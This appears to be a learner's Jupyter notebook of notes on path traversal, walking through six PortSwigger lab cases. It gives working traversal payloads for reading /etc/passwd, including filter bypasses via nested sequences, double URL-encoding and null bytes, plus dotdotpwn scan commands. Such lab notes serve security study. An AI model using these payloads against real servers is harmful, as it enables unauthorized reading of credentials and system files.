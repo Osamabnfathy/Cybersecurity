{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "----------------------------------------------------------------------------------\n",
    "                              # File Path Traversal Attacks                                 \n",
    "                              # Directory Traversal Attacks                                 "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Used Resources:\n",
    "\n",
    ">> PortSwigger Labs:\n",
    "   - https://portswigger.net/web-security/file-path-traversal\n",
    "\n",
    ">> Eng.Rana Khalil Playlist: (IMPORTANT)\n",
    "   - https://www.youtube.com/playlist?list=PLuyTk2_mYISL2DdD_m1ELEjpiPKxV98MO\n",
    "   \n",
    ">> Arab Hack Sploit Video:\n",
    "   - https://www.youtube.com/watch?v=S1OLanVAunM&list=PLTSGZiCtCBfMMLkmaN7tGEhbc0QbOEtEA&index=11"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# What is path traversal?\n",
    "\n",
    ">> Path traversal is also known as directory traversal. These vulnerabilities enable an attacker to read arbitrary files on the server that is running an application. This might include:\n",
    "   - Application code and data.\n",
    "   - Credentials for back-end systems.\n",
    "   - Sensitive operating system files.\n",
    "   \n",
    ">> EX of Path traversal Attack:\n",
    "   - Legitimate HTML code to get an image (<img src=\"/loadImage?filename=218.png\">)\n",
    "   - Mellicious URL (https://insecure-website.com/loadImage?filename=../../../etc/passwd)\n",
    "   - For Windows (https://insecure-website.com/loadImage?filename=..\\..\\..\\windows\\win.ini)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-1: File path traversal, simple case: (Manual)\n",
    "\n",
    ">> Mean to manipulate in the Image URL to read the /etc/passwd file:\n",
    "   - open any product image in a new tab\n",
    "   - change the (filename) parameter to (filename=../../../etc/passwd)\n",
    "   - in the Burb proxy you'll see the data of that file\n",
    "   \n",
    "   - OR you can change the Path of any post by Burb to (GET /image?filename=../../../etc/passwd)\n",
    "   - Then you can see the data in the response\n",
    "   \n",
    "    \n",
    "   - OR you can use a tool like (dotdotpwn) in linux\n",
    "   - In terminal(dotdotpwn -m http-url -u \"your_url\" -f \"File_wanted\" -k \"Match_word\" -b) in vuln Param type (TRAVERSAL), -b to break in first vulnerability\n",
    "   - like (dotdotpwn -m http-url -u \"https://abc.web-security.nt/image?filename=TRAVERSAL\" -f \"/etc/passwd\" -k \"root\" -b) "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-2: File path traversal, traversal sequences blocked with absolute path bypass: (Manual)\n",
    "\n",
    ">> Mean that the Traversal sequence in blocked so type the absolute path:\n",
    "   - open any product image in a new tab\n",
    "   - change the (filename) parameter to (filename=/etc/passwd)\n",
    "   - in the Burn proxy you'll see the data of that file\n",
    "   \n",
    "   - OR you can change the Path of any post by Burb to (GET /image?filename=/etc/passwd)\n",
    "   - Then you can see the data in the response\n",
    "   \n",
    "    \n",
    "   - OR you can use a tool like (dotdotpwn) in linux\n",
    "   - In terminal(dotdotpwn -m http-url -u \"your_url\" -f \"File_wanted\" -k \"Match_word\" -b) in vuln Param type (TRAVERSAL), -b to break in first vulnerability\n",
    "   - like (dotdotpwn -m http-url -u \"https://abc.web-security.nt/image?filename=TRAVERSAL\" -f \"/etc/passwd\" -k \"root\" -b) "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-3: File path traversal, traversal sequences stripped non-recursively: (Manual)\n",
    "\n",
    ">> Mean that the traversal sequence in stripped before using it on the server:\n",
    "   - open any product image in a new tab\n",
    "   - change the (filename) parameter to (filename=....//....//....//etc/passwd)\n",
    "   - OR to (filename=..././..././..././etc/passwd) (Working here)\n",
    "   - OR to (filename=....\\/....\\/....\\/etc/passwd) (Not Working here)\n",
    "   \n",
    "   - OR you can change the path of anay post by Burb to (GET /image?filename=....//....//....//etc/passwd)\n",
    "   - OR to (GET /image?filename=..././..././..././etc/passwd) (Working here)\n",
    "   - OR to (GET /image?filename=....\\/....\\/....\\/etc/passwd) (Not Working here)\n",
    "   - then you can see the data in the response\n",
    "   \n",
    "    \n",
    "   - OR you can use a tool like (dotdotpwn) in linux\n",
    "   - In terminal(dotdotpwn -m http-url -u \"your_url\" -f \"File_wanted\" -k \"Match_word\" -b) in vuln Param type (TRAVERSAL), -b to break in first vulnerability\n",
    "   - like (dotdotpwn -m http-url -u \"https://abc.web-security.nt/image?filename=TRAVERSAL\" -f \"/etc/passwd\" -k \"root\" -b) "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-4: File path traversal, traversal sequences stripped with superfluous URL-decode: (Manual)\n",
    "\n",
    ">> Mean that there is a sanitization for the input so you need a URL encoding to pass it:\n",
    "   - open any product image in a new tab\n",
    "   - Change the (filenaem) param to (filename=../../../etc/passwd) (Would not work)\n",
    "   - Try the other way (filenaem=..../..../..../etc/passwd) (Would not work)\n",
    "   - Try the URL-encoding (filenaem=%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd) (Would not work)\n",
    "   - Try Double URL-encoding (filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65/etc/passwd) >> (It will work)\n",
    "   - now you can see the result in the response\n",
    "   \n",
    "   - URL-encoding for (../../../) >> (%2e%2e%2f%2e%2e%2f%2e%2e) not working\n",
    "   - URL-encoding for (../../../etc/passwd) >> (%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64) not working\n",
    "   \n",
    "   - Double URL-encoding for (../../../) >> (%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65) it works\n",
    "   - Double URL-encoding for (../../../etc/passwd) >> (%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34) it works\n",
    "   \n",
    "   \n",
    "   - OR you can use a tool like (dotdotpwn) in linux\n",
    "   - In terminal(dotdotpwn -m http-url -u \"your_url\" -f \"File_wanted\" -k \"Match_word\" -b) in vuln Param type (TRAVERSAL), -b to break in first vulnerability\n",
    "   - like (dotdotpwn -m http-url -u \"https://abc.web-security.nt/image?filename=TRAVERSAL\" -f \"/etc/passwd\" -k \"root\" -b) "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-5: File path traversa, validation of start of path: (Manual)\n",
    "\n",
    ">> Mean that the request use the full file path for getting the images:\n",
    "   - open any product image in a new tab\n",
    "   - Change the (filename) param to (filename=/var/www/images/../../../etc/passwd)\n",
    "   - now you can see the data in the response\n",
    "   \n",
    "   - OR you can change the Path of any post by Burb to (GET /image?filename=/var/www/images/../../../etc/passwd)\n",
    "   - Then you can see the data in the response\n",
    "   \n",
    "   \n",
    "   - OR you can use a tool like (dotdotpwn) in linux\n",
    "   - In terminal(dotdotpwn -m http-url -u \"your_url\" -f \"File_wanted\" -k \"Match_word\" -b) in vuln Param type (TRAVERSAL), -b to break in first vulnerability\n",
    "   - like (dotdotpwn -m http-url -u \"https://abc.web-security.nt/image?filename=/var/www/images/TRAVERSAL\" -f \"/etc/passwd\" -k \"root\" -b) "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-6: File path traversal, validation of file extension with null byte bypass: (Manual)\n",
    "\n",
    ">> Mean that the app ecpect to see the file extension in the end of the URL, so we use the NULL BYTE (%00) to ignore the extension:\n",
    "   - open any product image in a new tab \n",
    "   - change the (filename) param to (filename=../../../etc/passwd) (would not work)\n",
    "   - Try (filename=../../../etc/passwd%00.jpg) it works\n",
    "   - then you can see the data in the response\n",
    "   \n",
    "    \n",
    "   - OR you can use a tool like (dotdotpwn) in linux\n",
    "   - In terminal(dotdotpwn -m http-url -u \"your_url\" -f \"File_wanted\" -k \"Match_word\" -b) in vuln Param type (TRAVERSAL), -b to break in first vulnerability\n",
    "   - like (dotdotpwn -m http-url -u \"https://abc.web-security.nt/image?filename=TRAVERSAL\" -f \"/etc/passwd\" -k \"root\" -b -e \"%00.jpg\") "
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
